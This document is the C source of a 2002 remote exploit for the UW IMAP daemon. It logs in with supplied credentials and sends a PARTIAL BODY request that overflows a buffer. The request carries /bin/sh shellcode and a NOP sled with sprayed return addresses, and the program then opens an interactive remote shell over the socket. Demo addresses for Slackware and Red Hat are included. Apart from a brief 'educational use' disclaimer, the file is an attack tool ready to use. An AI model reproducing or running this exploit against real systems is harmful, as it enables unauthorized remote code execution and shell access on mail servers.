/*
 * http://www.freeweb.nu/mantra/05_2002/uw-imapd.html
 *
 * uw-imapd.c - Remote exploit for uw imapd CAPABILITY IMAP4 
 *
 * Copyright (C) 2002  Christophe "korty" Bailleux <cb@t-online.fr>
 * Copyright (C) 2002  Kostya Kortchinsky <kostya.kortchinsky@renater.fr> 
 *
 * All Rights Reserved
 * The copyright notice above does not evidence any
 * actual or intended publication of such source code.
 * 
 * Usage: ./wu-imap host user password shellcode_addressr alignement
 * 
 * Demonstration values for Linux:
 * 
 * (slackware 7.1) ./uw-imap localhost test test1234 0xbffffa60 0
 * (Redhat 7.2)    ./uw-imap localhost test test1234 0xbffff760 0
 * 
 * THIS CODE FOR EDUCATIONAL USE ONLY IN AN ETHICAL MANNER
 * 
 * The code is dirty...but we like dirty things :)
 * And it works very well :)
 *  
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include  <sys/types.h>
#include  <sys/socket.h>
#include  <netinet/in.h>
#include  <stdio.h>
#include  <string.h>
#include  <netdb.h>

#define GOOD_EXIT		0
#define ERROR_EXIT		1

#define DEFAULT_PROTOCOL	0
#define SEND_FLAGS		0
#define RECV_FLAGS		0

/* http://downloads.securityfocus.com/library/advanced.txt by Taeho Oh ( ohhara@postech.edu ) */

char sc[]=
"\xeb\x38"                      /* jmp 0x38              */
"\x5e"                          /* popl %esi             */
"\x80\x46\x01\x50"              /* addb $0x50,0x1(%esi)  */
"\x80\x46\x02\x50"              /* addb $0x50,0x2(%esi)  */
"\x80\x46\x03\x50"              /* addb $0x50,0x3(%esi)  */
"\x80\x46\x05\x50"              /* addb $0x50,0x5(%esi)  */
"\x80\x46\x06\x50"              /* addb $0x50,0x6(%esi)  */
"\x89\xf0"                      /* movl %esi,%eax        */
"\x83\xc0\x08"                  /* addl $0x8,%eax        */
"\x89\x46\x08"                  /* movl %eax,0x8(%esi)   */
"\x31\xc0"                      /* xorl %eax,%eax        */
"\x88\x46\x07"                  /* movb %eax,0x7(%esi)   */
"\x89\x46\x0c"                  /* movl %eax,0xc(%esi)   */
"\xb0\x0b"                      /* movb $0xb,%al         */
"\x89\xf3"                      /* movl %esi,%ebx        */
"\x8d\x4e\x08"                  /* leal 0x8(%esi),%ecx   */
"\x8d\x56\x0c"                  /* leal 0xc(%esi),%edx   */
"\xcd\x80"                      /* int $0x80             */
"\x31\xdb"                      /* xorl %ebx,%ebx        */
"\x89\xd8"                      /* movl %ebx,%eax        */
"\x40"                          /* inc %eax              */
"\xcd\x80"                      /* int $0x80             */
"\xe8\xc3\xff\xff\xff"          /* call -0x3d            */
"\x2f\x12\x19\x1e\x2f\x23\x18"; /* .string "/bin/sh"     */

int imap_send(int s, char *buffer)
{
	int result = GOOD_EXIT;
	
	if (send(s, buffer, strlen(buffer), SEND_FLAGS) < 0)
		result = ERROR_EXIT;

	return result;
}

int imap_receive(int s, char *buffer, int size)
{
	int result = GOOD_EXIT;
	int char_recv;
	int tot_recv = 0;

	bzero(buffer, size);
	do {
		char_recv = recv(s, &buffer[tot_recv], size - tot_recv, RECV_FLAGS);
		if (char_recv > 0)
			tot_recv += char_recv;
	} while ((char_recv > 0) && (strchr(buffer, 13) == NULL));

	if (char_recv < 0) 
		result = ERROR_EXIT;

	return result;
}

#define BANNER "pwd ; uname -a"

int interact( int fd )
{
     fd_set fds;
     ssize_t ssize;
     char buffer[ 666 ];

	 write( fd, BANNER"\n", sizeof(BANNER) );
     while ( 12 != 42 ) {
           FD_ZERO( &fds );
           FD_SET( STDIN_FILENO, &fds );
           FD_SET( fd, &fds);
           select( fd + 1, &fds, NULL, NULL, NULL );

           if ( FD_ISSET(STDIN_FILENO, &fds) ) {
              ssize = read( STDIN_FILENO, buffer, sizeof(buffer) );
              if ( ssize < 0 ) {
                 return( -1 );
              }
              if ( ssize == 0 ) {
                 return( 0 );
              }

              write( fd, buffer, ssize );

           }

           if ( FD_ISSET(fd, &fds) ) {
               ssize = read( fd, buffer, sizeof(buffer) );
               if ( ssize < 0 ) {
                  return( -1 );
                }
               if ( ssize == 0 ) {
                  return( 0 );
               }

               write( STDOUT_FILENO, buffer, ssize );

           }
     }
     return( -1 );
 }


void usage(char *cmd)
{
	printf("Usage: %s host user pass shellcode_addr align\n", cmd);
	printf("Demo: %s localhost test test1234 0xbffffa40 0\n", cmd);
	exit(0);
}


int main(int argc, char *argv[])
{
	struct sockaddr_in server;
	struct servent *sp;
	struct hostent *hp;
	int s, i , ret, align;
	int blaw = 1024;
	char *user, *passwd;

	char imap_info[4096];
	char imap_login[4096];
	char imap_query[4096];
	char buffer[2048];

	int exit_code = GOOD_EXIT;

	if (argc != 6) usage(argv[0]);

	user = argv[2];
	passwd = argv[3];
	ret = strtoul(argv[4], NULL, 16);
	align = atoi(argv[5]);

	if ((hp = gethostbyname(argv[1])) == NULL) 
		exit_code = ERROR_EXIT;

	if ((exit_code == GOOD_EXIT) && (sp = getservbyname("imap2", "tcp")) == NULL)
		exit_code = ERROR_EXIT;

	if (exit_code == GOOD_EXIT) {
		if ((s = socket(PF_INET, SOCK_STREAM, DEFAULT_PROTOCOL)) < 0)
			return exit_code = ERROR_EXIT;
			
		bzero((char *) &server, sizeof(server));
		bcopy(hp->h_addr, (char *) &server.sin_addr, hp->h_length);
		server.sin_family = hp->h_addrtype;
		server.sin_port = sp->s_port;
		if (connect(s, (struct sockaddr *) &server, sizeof(server)) < 0)
			exit_code = ERROR_EXIT;
		else {
			printf("[1;34mV�rification de la banni�re :[0m\n");
			if (exit_code = imap_receive(s, imap_info, sizeof(imap_info)) == ERROR_EXIT) {
				shutdown(s, 2);
				close(s);
				return exit_code;
			}

			printf("%s", imap_info);
			if (strstr(imap_info, "IMAP4rev1 200") == NULL) {
				printf("[1;32mService IMAPd non reconnu ...[0m\n");
				shutdown(s, 2);
				close(s);
				return exit_code;
			}
					
			if ((exit_code = imap_send(s, "x CAPABILITY\n")) == ERROR_EXIT) {
				shutdown(s, 2);
				close(s);
				return exit_code;
			}
		
			printf("[1;34mV�rification des options du service :[0m\n");
			if ((exit_code = imap_receive(s, imap_info, sizeof(imap_info))) == ERROR_EXIT) {
				shutdown(s, 2);
				close(s);
				return exit_code;
			}
		
			printf("%s", imap_info);
			if (strstr(imap_info, " IMAP4 ") == NULL) {
				printf("[1;32mService IMAPd non vuln�rable ...[0m\n");
				shutdown(s, 2);
				close(s);
				return exit_code;
			}

			printf("[1;31mService IMAPd vuln�rable ...[0m\n");
			sprintf(imap_login, "x LOGIN %s %s\n", user, passwd);
			if ((exit_code = imap_send(s, imap_login)) == ERROR_EXIT) {
				shutdown(s, 2);
				close(s);
				return exit_code;
			}
			
			if ((exit_code = imap_receive(s, imap_info, sizeof(imap_info))) == ERROR_EXIT) {
				shutdown(s, 2);
				close(s);
				return exit_code;
			}
			printf("%s", imap_info);

			if ((exit_code = imap_send(s, "x SELECT Inbox\n")) == ERROR_EXIT) {
				shutdown(s, 2);
				close(s);
				return exit_code;
			}
			
			if ((exit_code = imap_receive(s, imap_info, sizeof(imap_info))) == ERROR_EXIT) {
				shutdown(s, 2);
				close(s);
				return exit_code;
			}
			printf("%s", imap_info);
		
			memset(buffer, 0x90, sizeof(buffer));
			memcpy(buffer + 512, sc, strlen(sc));

			for (i = blaw + align ; i < 1096; i +=4)
				*(unsigned int *)(&buffer[i]) = ret;

			*(unsigned int *)(&buffer[i + 1]) = 0;

			sprintf(imap_query, "x PARTIAL 1 BODY[%s] 1 1\n", buffer);
			if ((exit_code = imap_send(s, imap_query)) == ERROR_EXIT) {
				shutdown(s, 2);
				close(s);
				return exit_code;
			}

			if ((exit_code = imap_receive(s, imap_info, sizeof(imap_info))) == ERROR_EXIT) {
				shutdown(s, 2);
				close(s);
				return exit_code;
			}

			if ((exit_code = imap_send(s, "x LOGOUT\n")) == ERROR_EXIT) {
				shutdown(s, 2);
				close(s);
				return exit_code;
			}
			
			if ((exit_code = imap_receive(s, imap_info, sizeof(imap_info))) == ERROR_EXIT) {
				shutdown(s, 2);
				close(s);
				return exit_code;
			}
		}
	}
		
    	i = interact( s );

	return exit_code;
}
